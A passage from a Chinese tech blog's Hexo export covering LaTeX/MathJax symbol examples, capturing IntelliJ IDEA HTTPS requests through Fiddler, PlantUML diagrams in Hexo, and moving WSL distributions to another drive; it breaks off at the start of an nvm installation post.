<tr>
<td style="text-align:left">\hookrightarrow</td>
<td style="text-align:center"><script type="math/tex">\hookrightarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\leftharpoonup</td>
<td style="text-align:center"><script type="math/tex">\leftharpoonup</script></td>
</tr>
<tr>
<td style="text-align:left">\rightharpoonup</td>
<td style="text-align:center"><script type="math/tex">\rightharpoonup</script></td>
</tr>
<tr>
<td style="text-align:left">\leftharpoondown</td>
<td style="text-align:center"><script type="math/tex">\leftharpoondown</script></td>
</tr>
<tr>
<td style="text-align:left">\rightharpoondown</td>
<td style="text-align:center"><script type="math/tex">\rightharpoondown</script></td>
</tr>
<tr>
<td style="text-align:left">\rightleftharpoons</td>
<td style="text-align:center"><script type="math/tex">\rightleftharpoons</script></td>
</tr>
<tr>
<td style="text-align:left">\nearrow</td>
<td style="text-align:center"><script type="math/tex">\nearrow</script></td>
</tr>
<tr>
<td style="text-align:left">\leadsto</td>
<td style="text-align:center"><script type="math/tex">\leadsto</script></td>
</tr>
<tr>
<td style="text-align:left">\searrow</td>
<td style="text-align:center"><script type="math/tex">\searrow</script></td>
</tr>
<tr>
<td style="text-align:left">\nwarrow</td>
<td style="text-align:center"><script type="math/tex">\nwarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\dashrightarrow</td>
<td style="text-align:center"><script type="math/tex">\dashrightarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\dashleftarrow</td>
<td style="text-align:center"><script type="math/tex">\dashleftarrow</script></td>
</tr>
<tr>
<td style="text-align:left">\curvearrowleft</td>
<td style="text-align:center"><script type="math/tex">\curvearrowleft</script></td>
</tr>
<tr>
<td style="text-align:left">\circlearrowleft</td>
<td style="text-align:center"><script type="math/tex">\circlearrowleft</script></td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<h1 id="部分示例"><a href="#部分示例" class="headerlink" title="部分示例"></a>部分示例</h1><ul>
<li>上下标</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">y^3</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">y^3</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">y_3</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">y_3</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a_3^2</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">a_3^2</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a^&#123;2+2&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">a^{2+2}</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a_&#123;i,j&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">a_{i,j}</script><blockquote>
<ul>
<li>极限</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\lim\limits_&#123;x \to 1&#125; \frac&#123;x^2-1&#125;&#123;x-1&#125;</span><br></pre></td></tr></table></figure>
<p>$\lim\limits_{x \to 1} \frac{x^2-1}{x-1}$</p>
<blockquote>
<ul>
<li>导数和微积分</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&apos;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">x'</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x^\prime</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">x^\prime</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\dot&#123;x&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\dot{x}</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ddot&#123;y&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\ddot{y}</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\int_&#123;-N&#125;^&#123;N&#125; e^x\, dx</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\int_{-N}^{N} e^x\, dx</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\begin&#123;matrix&#125; \int_&#123;-N&#125;^&#123;N&#125; e^x\, dx\end&#123;matrix&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\begin{matrix} \int_{-N}^{N} e^x\, dx\end{matrix}</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\iint_&#123;D&#125;^&#123;W&#125; \, dx\,dy</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\iint_{D}^{W} \, dx\,dy</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\iiint_&#123;E&#125;^&#123;V&#125; \, dx\,dy\,dz</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\iiint_{E}^{V} \, dx\,dy\,dz</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\iiiint_&#123;F&#125;^&#123;U&#125; \, dx\,dy\,dz\,dt</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\iiiint_{F}^{U} \, dx\,dy\,dz\,dt</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\oint_&#123;C&#125; x^3\, dx + 4y^2\, dy</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\oint_{C} x^3\, dx + 4y^2\, dy</script><blockquote>
<ul>
<li>向量</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\vec&#123;c&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\vec{c}</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\overleftarrow&#123;a b&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\overleftarrow{a b}</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\overrightarrow&#123;c d&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\overrightarrow{c d}</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\widehat&#123;e f g&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\widehat{e f g}</script><blockquote>
<ul>
<li>高亮部分</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> \bbox[yellow]</span><br><span class="line">&#123;</span><br><span class="line">e^x=\lim_&#123;n\to\infty&#125; \left( 1+\frac&#123;x&#125;&#123;n&#125; \right)^n</span><br><span class="line">\qquad</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
{
e^x=\lim_{n\to\infty} \left( 1+\frac{x}{n} \right)^n
\qquad
}</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\bbox[yellow,5px,border:2px solid red]</span><br><span class="line">&#123;</span><br><span class="line">e^x=\lim_&#123;n\to\infty&#125; \left( 1+\frac&#123;x&#125;&#123;n&#125; \right)^n</span><br><span class="line">\qquad (1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
{
e^x=\lim_{n\to\infty} \left( 1+\frac{x}{n} \right)^n
\qquad (1)
}</script><blockquote>
<ul>
<li>方程组</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\begin&#123;cases&#125;</span><br><span class="line">a_1x+b_1y+c_1z=d_1\\</span><br><span class="line">a_2x+b_2y+c_2z=d_2\\</span><br><span class="line">a_3x+b_3y+c_3z=d_3\\</span><br><span class="line">\end&#123;cases&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
\begin{cases}
a_1x+b_1y+c_1z=d_1\\
a_2x+b_2y+c_2z=d_2\\
a_3x+b_3y+c_3z=d_3\\
\end{cases}</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\left\&#123;</span><br><span class="line">\begin&#123;aligned&#125; </span><br><span class="line">a_1x+b_1y+c_1z &amp;=d_1+e_1 \\ </span><br><span class="line">a_2x+b_2y&amp;=d_2 \\ </span><br><span class="line">a_3x+b_3y+c_3z &amp;=d_3 </span><br><span class="line">\end&#123;aligned&#125; </span><br><span class="line">\right.</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
\left\{
\begin{aligned} 
a_1x+b_1y+c_1z &=d_1+e_1 \\ 
a_2x+b_2y&=d_2 \\ 
a_3x+b_3y+c_3z &=d_3 
\end{aligned} 
\right.</script><blockquote>
<ul>
<li>除法</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\require&#123;enclose&#125;</span><br><span class="line">\begin&#123;array&#125;&#123;r&#125;</span><br><span class="line">                13  \\[-3pt]</span><br><span class="line">4 \enclose&#123;longdiv&#125;&#123;52&#125; \\[-3pt]</span><br><span class="line">     \underline&#123;4&#125;\phantom&#123;2&#125; \\[-3pt]</span><br><span class="line">                12  \\[-3pt]</span><br><span class="line">     \underline&#123;12&#125;</span><br><span class="line">\end&#123;array&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
\require{enclose}
\begin{array}{r}
                13  \\[-3pt]
4 \enclose{longdiv}{52} \\[-3pt]
     \underline{4}\phantom{2} \\[-3pt]
                12  \\[-3pt]
     \underline{12}
\end{array}</script><blockquote>
<ul>
<li>求和</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\sum_&#123;n=1&#125;^\infty \frac&#123;1&#125;&#123;n^2&#125; \to</span><br><span class="line">  \textstyle \sum_&#123;n=1&#125;^\infty \frac&#123;1&#125;&#123;n^2&#125; \to</span><br><span class="line">  \displaystyle \sum_&#123;n=1&#125;^\infty \frac&#123;1&#125;&#123;n^2&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
  \textstyle \sum_{n=1}^\infty \frac{1}{n^2} \to
  \displaystyle \sum_{n=1}^\infty \frac{1}{n^2}</script><blockquote>
<ul>
<li>矩阵</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在起始、结束标记处用下列词替换 matrix:</span><br><span class="line">pmatrix：小括号边框 ,例如 ()</span><br><span class="line">bmatrix：中括号边框, 例如 []</span><br><span class="line">Bmatrix：大括号边框,例如 &#123;&#125;</span><br><span class="line">vmatrix：单竖线边框,例如 ||</span><br><span class="line">Vmatrix：双竖线边框,例如 ∥∥</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">\begin&#123;bmatrix&#125;</span><br><span class="line">1 &amp; 2 &amp; 2 \\</span><br><span class="line">2 &amp; 3 &amp; 4 \\</span><br><span class="line">4 &amp; 4 &amp; 2</span><br><span class="line">\end&#123;bmatrix&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
\begin{bmatrix}
1 & 2 & 2 \\
2 & 3 & 4 \\
4 & 4 & 2
\end{bmatrix}</script><p>横省略号：\cdots,例如 ⋯⋯<br>竖省略号：\vdots,例如 ⋮⋮<br>斜省略号：\ddots,例如 ⋱</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\begin&#123;bmatrix&#125;</span><br><span class="line">&#123;a_&#123;11&#125;&#125;&amp;&#123;a_&#123;12&#125;&#125;&amp;&#123;\cdots&#125;&amp;&#123;a_&#123;1n&#125;&#125;\\</span><br><span class="line">&#123;a_&#123;21&#125;&#125;&amp;&#123;a_&#123;22&#125;&#125;&amp;&#123;\cdots&#125;&amp;&#123;a_&#123;2n&#125;&#125;\\</span><br><span class="line">&#123;\vdots&#125;&amp;&#123;\vdots&#125;&amp;&#123;\cdots&#125;&amp;&#123;\vdots&#125;\\</span><br><span class="line">&#123;a_&#123;m1&#125;&#125;&amp;&#123;a_&#123;m2&#125;&#125;&amp;&#123;\cdots&#125;&amp;&#123;a_&#123;mn&#125;&#125;\\</span><br><span class="line">\end&#123;bmatrix&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">

\begin{bmatrix}
{a_{11}}&{a_{12}}&{\cdots}&{a_{1n}}\\
{a_{21}}&{a_{22}}&{\cdots}&{a_{2n}}\\
{\vdots}&{\vdots}&{\cdots}&{\vdots}\\
{a_{m1}}&{a_{m2}}&{\cdots}&{a_{mn}}\\
\end{bmatrix}</script><blockquote>
<ul>
<li>小数及单位</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4321.1234</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">4321.1234</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">54\,321.123\,45 54321.12345</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">54\,321.123\,45 54321.12345</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\mathrm&#123;e&#125;\,6</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\mathrm{e}\,6</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\mathrm&#123;kg&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\mathrm{kg}</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\mathrm&#123;m&#125;/\mathrm&#123;s&#125;^2</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\mathrm{m}/\mathrm{s}^2</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\mathrm&#123;kg&#125;\!\cdot\!\mathrm&#123;m&#125;^2 /\left(\mathrm&#123;C&#125;\!\cdot\!\mathrm&#123;s&#125;\right)</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">\mathrm{kg}\!\cdot\!\mathrm{m}^2 /\left(\mathrm{C}\!\cdot\!\mathrm{s}\right)</script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">N_A = 6.022\times10^&#123;23&#125; \ \mathrm&#123;mol&#125;^&#123;-1&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">N_A = 6.022\times10^{23} \ \mathrm{mol}^{-1}</script><blockquote>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><p><a href="https://blog.csdn.net/MyLinChi/article/details/78527223" target="_blank" rel="noopener">LaTex 各种命令、符号</a></p>
</li>
<li><p><a href="https://math.meta.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference?page=1&amp;tab=votes#tab-top" target="_blank" rel="noopener">MathJax basic tutorial and quick reference</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>latex</tag>
      </tags>
  </entry>
  <entry>
    <title>Fiddler抓取idea请求数据包</title>
    <url>/2021/12/08/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/idea%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<p>由于项目中部分请求需要调用第三放接口,为了方便调试,抓取一下真正的请求信息,方便对可能出现的问题进行排查.</p>
<p>下面就来配置一下idea来抓取请求。</p>
<h1 id="导出证书"><a href="#导出证书" class="headerlink" title="导出证书"></a>导出证书</h1><p>为了抓取https请求，这一步必不可少。<br>首先,fiddler中在options-&gt;https-&gt;Actions-&gt;Export Root Certificate to Desktop,将证书保存到桌面。</p>
<p><img src="/2021/12/08/开发工具/idea抓包/2021-12-08_123910.jpg" alt></p>
<h1 id="jre配置"><a href="#jre配置" class="headerlink" title="jre配置"></a>jre配置</h1><p>找到jdk的安装目录，进入到jre/lib/security下，将证书复制到该目录。<br>执行如下命令,导入证书,默认密码: <code>changeit</code><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">keytool -keystore cacerts -importcert -<span class="built_in">alias</span> fiddlerRoot -file FiddlerRoot.cer</span><br></pre></td></tr></table></figure></p>
<p>选择信任密钥库即可.<br><img src="/2021/12/08/开发工具/idea抓包/20211208124512.png" alt></p>
<h1 id="spring-boot项目配置"><a href="#spring-boot项目配置" class="headerlink" title="spring boot项目配置"></a>spring boot项目配置</h1><p>在idea中配置项目的虚拟机参数,指定代理的地址和端口,对应fiddler配置的端口号,此处为<code>8888</code>。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-DproxySet=true </span><br><span class="line">-DproxyHost=127.0.0.1</span><br><span class="line">-DproxyPort=8888</span><br></pre></td></tr></table></figure></p>
<p><img src="/2021/12/08/开发工具/idea抓包/20211208124655.png" alt></p>
<p>以上就完成了项目的抓包配置。</p>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>fiddler</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo集成plantuml</title>
    <url>/2018/07/22/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/hexo%E9%9B%86%E6%88%90plantuml/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-tag-plantuml --save</span><br></pre></td></tr></table></figure>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>package.json中添加依赖<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">"hexo-tag-plantuml": "^1.0.0"</span><br></pre></td></tr></table></figure></p>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><blockquote>
<ul>
<li>用例图(use case)</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% plantuml %&#125;</span><br><span class="line">用户 &lt;|-- 管理员</span><br><span class="line">top to bottom direction</span><br><span class="line">用户 --&gt; (用户查看)</span><br><span class="line">用户 --&gt; (角色查看)</span><br><span class="line">管理员 --&gt; (用户查看)</span><br><span class="line">管理员 --&gt; (角色查看)</span><br><span class="line">管理员 --&gt; (用户编辑)</span><br><span class="line">管理员 --&gt; (角色编辑)</span><br><span class="line">&#123;% endplantuml %&#125;</span><br></pre></td></tr></table></figure>
<img src="http://www.plantuml.com/plantuml/svg/UpvbnREExGesDRgw2i_NBNm-eUtfn1bS9Va52YNv2adv9INvkGefcKMfoIMP-NbSpo6gTNNj53GWx6VpbpwVqws98lDY-QGNdPlWCZ1JiMf3bIH2v_CzqrxicuX39qmI0000">
<blockquote>
<ul>
<li>活动图(activity diagram)</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% plantuml %&#125;</span><br><span class="line">start</span><br><span class="line"></span><br><span class="line">if (用户是否登录?) then (是)</span><br><span class="line">  :进入主菜单;</span><br><span class="line">else (否)</span><br><span class="line">  :跳转登录;</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">stop</span><br><span class="line">&#123;% endplantuml %&#125;</span><br></pre></td></tr></table></figure>
<img src="http://www.plantuml.com/plantuml/svg/Aov9B2hXuifCKz1uFcN5iuxjpsQiVpfXsVEPkv_kdMglgL2IaPgde04KrEHIKB1wiN_sqzQbJtRiVj4_vsdlL6kkr9pYL0KDe0Q8zFRDB_QkWUW5okMbPAPnSHMNv1S00000">
<blockquote>
<ul>
<li>类图(class diagram)</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% plantuml %&#125;</span><br><span class="line">abstract class AbstractList&#123;</span><br><span class="line">    - final int offset;</span><br><span class="line">    - int size;</span><br><span class="line">    + E remove(int index)</span><br><span class="line">    # void removeRange(int fromIndex, int toIndex)</span><br><span class="line">&#125;</span><br><span class="line">abstract AbstractCollection</span><br><span class="line">interface List</span><br><span class="line">interface Collection&#123;</span><br><span class="line">     &#123;abstract&#125; int size()</span><br><span class="line">     &#123;abstract&#125; boolean retainAll(Collection&lt;?&gt; c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">List &lt;|-- AbstractList</span><br><span class="line">Collection &lt;|-- AbstractCollection</span><br><span class="line"></span><br><span class="line">Collection &lt;|- List</span><br><span class="line">AbstractCollection &lt;|- AbstractList</span><br><span class="line">AbstractList &lt;|-- ArrayList</span><br><span class="line"></span><br><span class="line">class ArrayList &#123;</span><br><span class="line">  Object[] elementData</span><br><span class="line">  size()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum TimeUnit &#123;</span><br><span class="line">  DAYS</span><br><span class="line">  HOURS</span><br><span class="line">  MINUTES</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">annotation SuppressWarnings</span><br><span class="line">&#123;% endplantuml %&#125;</span><br></pre></td></tr></table></figure>
<img src="http://www.plantuml.com/plantuml/svg/PP7VIiCm5CRlynG7lEdGxGKSId432-fWNH4HBqwxqn59JqQI3NNktKtwnxOiD-6SxykNtqamjyvWuQ1GQ2t4RVaahJi9y6iAfMHK8Dc1BajBxhRjXuwLFzJKrx04GvK-KXG4oLlwcjJA5HortBRY6ddNE4gZgoIuRkeafvFco5bWnzJHF6Ybg71Ii_1MCYKM105nKFQUXXjENSpvdpIQN4YvregGFPr3oR5IKHyqlx-38W29S1VCVsUpqGE9tZeM1xnZpxIXllJLsYXxM0JLoyRWTws9zhEw1eIHL_cdpth_059K4Ri5ElJjTcu_1F6XWesiA6FP75d4RwdV7bVPEkpFoKksMQR1YypQOKsM7lPxGzQ-ec79E_i7">
<blockquote>
<ul>
<li>对象图(object diagram)<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% plantuml %&#125;</span><br><span class="line">object Object01</span><br><span class="line">object Object02</span><br><span class="line">object Object03</span><br><span class="line">object Object04</span><br><span class="line">object Object05</span><br><span class="line">object Object06</span><br><span class="line">object Object07</span><br><span class="line">object Object08</span><br><span class="line"></span><br><span class="line">Object01 &lt;|-- Object02</span><br><span class="line">Object03 *-- Object04</span><br><span class="line">Object05 o-- &quot;4&quot; Object06</span><br><span class="line">Object07 .. Object08 : some labels</span><br><span class="line">&#123;% endplantuml %&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<img src="http://www.plantuml.com/plantuml/svg/oq_AIaqkKV07KmQ6NFaeV2CqlZ4QtmIDRuh6DqFZcwFnBRYuO3OhsDJewYBiXLcee8KGDO69cYha0qMLJ9GGzi0iKD3JWnkkOALGd9-Rgf2Jc9IQKmm0">
<blockquote>
<ul>
<li>时序图(sequence diagram)</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;%plantuml %&#125;</span><br><span class="line">participant User</span><br><span class="line"></span><br><span class="line">User -&gt; A: DoWork</span><br><span class="line">activate A</span><br><span class="line"></span><br><span class="line">A -&gt; B: &lt;&lt; createRequest &gt;&gt;</span><br><span class="line">activate B</span><br><span class="line"></span><br><span class="line">B -&gt; C: DoWork</span><br><span class="line">activate C</span><br><span class="line">C --&gt; B: WorkDone</span><br><span class="line">destroy C</span><br><span class="line"></span><br><span class="line">B --&gt; A: RequestCreated</span><br><span class="line">deactivate B</span><br><span class="line"></span><br><span class="line">A -&gt; User: Done</span><br><span class="line">deactivate A</span><br><span class="line">&#123;% endplantuml %&#125;</span><br></pre></td></tr></table></figure>
<img src="http://www.plantuml.com/plantuml/svg/POv12iCm30Jl-mfz81y8mM0xBoYKdesZWod4gQ8M-ljQJY65NdJGxixkbaHBBbjQbQux2s2N1aT-fBdUgjoHifPNKYOFU9F2IDD4MRWzB_nuygxatEaBG31V_4T4H1eEX0bpNHbBoqjzDyrYH_KN6tl7qYo_y3x2TXg_0yw97m00">
<blockquote>
<ul>
<li>部署图(deployment diagram)<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% plantuml %&#125;</span><br><span class="line">actor actor</span><br><span class="line">agent agent</span><br><span class="line">artifact artifact</span><br><span class="line">boundary boundary</span><br><span class="line">card card</span><br><span class="line">cloud cloud</span><br><span class="line">component component</span><br><span class="line">control control</span><br><span class="line">database database</span><br><span class="line">entity entity</span><br><span class="line">file file</span><br><span class="line">folder folder</span><br><span class="line">frame frame</span><br><span class="line">interface  interface</span><br><span class="line">node node</span><br><span class="line">package package</span><br><span class="line">queue queue</span><br><span class="line">stack stack</span><br><span class="line">rectangle rectangle</span><br><span class="line">storage storage</span><br><span class="line">usecase usecase</span><br><span class="line">&#123;% endplantuml %&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<img src="http://www.plantuml.com/plantuml/svg/FOz14eGm20Jlymg-XWbQrhh1HNBmzmiQlVHqGK885rSZJe8NQKuNmURh76Lw19FsLjbEUWI5hL82PTCUcaJHxwuj9xqMjUQc6ur4PUU93w574ATMF-aEpEicbC2iMnMZEp0RVwEHnDfSB3OJebVHj0ebi7Fvn5Te97vTkj1571v5kWYJujoMUE-rwAlbtP7eXvJSTkGV">
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="http://plantuml.com/" target="_blank" rel="noopener">plantuml官网</a></li>
<li><a href="http://www.uml.org.cn/oobject/201610282.asp" target="_blank" rel="noopener">详解UML图之类图</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>windows下wsl切换linux安装目录</title>
    <url>/2022/02/25/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/windows%E4%B8%8Bwsl%E5%88%87%E6%8D%A2%E7%9B%AE%E5%BD%95/</url>
    <content><![CDATA[<p>window 10下安装linux后对开发来说更加方便了,但是linux默认安装在C盘,对于C盘空间不足的同学迫切需要将linux安装到其他目录,WSL默认安装目录为:<code>C:\Users\Administrator\AppData\Local\Packages</code>，本文就来实现将linux安装到D盘。</p>
<h1 id="查看已安装linx分发版本"><a href="#查看已安装linx分发版本" class="headerlink" title="查看已安装linx分发版本"></a>查看已安装linx分发版本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt; wsl -l -v</span><br><span class="line">  NAME          STATE           VERSION</span><br><span class="line">* Ubuntu        Stopped         2</span><br><span class="line">  kali-linux    Stopped         2</span><br></pre></td></tr></table></figure>
<h1 id="将分发导出到tar文件"><a href="#将分发导出到tar文件" class="headerlink" title="将分发导出到tar文件"></a>将分发导出到tar文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;wsl --<span class="built_in">export</span> Ubuntu d:\WSL\ubuntu.tar</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;wsl --<span class="built_in">export</span> kali-linux d:\WSL\kali.tar</span><br></pre></td></tr></table></figure>
<h1 id="注销分发并删除根文件系统"><a href="#注销分发并删除根文件系统" class="headerlink" title="注销分发并删除根文件系统"></a>注销分发并删除根文件系统</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;wsl  --unregister Ubuntu</span><br><span class="line">正在注销...</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;wsl -l -v</span><br><span class="line">  NAME          STATE           VERSION</span><br><span class="line">* kali-linux    Stopped         2</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;wsl  --unregister kali-linux</span><br><span class="line">正在注销...</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;wsl -l -v</span><br><span class="line">适用于 Linux 的 Windows 子系统没有已安装的分发版。</span><br><span class="line">可以通过访问 Microsoft Store 来安装分发版:</span><br><span class="line">https://aka.ms/wslstore</span><br></pre></td></tr></table></figure>
<h1 id="导入tar文件"><a href="#导入tar文件" class="headerlink" title="导入tar文件"></a>导入tar文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;wsl --import Ubuntu d:\WSL\ubuntu d:\WSL\ubuntu.tar --version 2</span><br></pre></td></tr></table></figure>
<h1 id="配置用户名"><a href="#配置用户名" class="headerlink" title="配置用户名"></a>配置用户名</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ubuntu config --default-user wolf</span><br></pre></td></tr></table></figure>
<h1 id="进入wsl"><a href="#进入wsl" class="headerlink" title="进入wsl"></a>进入wsl</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;wsl -l -v</span><br><span class="line">  NAME      STATE           VERSION</span><br><span class="line">* Ubuntu    Stopped         2</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;wsl</span><br><span class="line">To run a <span class="built_in">command</span> as administrator (user <span class="string">"root"</span>), use <span class="string">"sudo &lt;command&gt;"</span>.</span><br><span class="line">See <span class="string">"man sudo_root"</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">wolf@PC-2022:/mnt/c/Users/Administrator$ whoami</span><br><span class="line">wolf</span><br></pre></td></tr></table></figure>
<p>最后删除导出的tar文件即可。</p>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>nvm安装</title>
    <url>/2012/02/16/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/nvm%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p> nvm全名node.js version management，是一个nodejs的版本管理工具。通过它可以安装和切换不同版本的nodejs。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p> 到<a href="https://github.com/coreybutler/nvm-windows/releases" target="_blank" rel="noopener">nvm github地址</a>下载nvm,一步一步安装即可。最好安装到没有空格、中文的目录里。<br> 基本用法在安装完成后,输入nvm即可看到:</p>
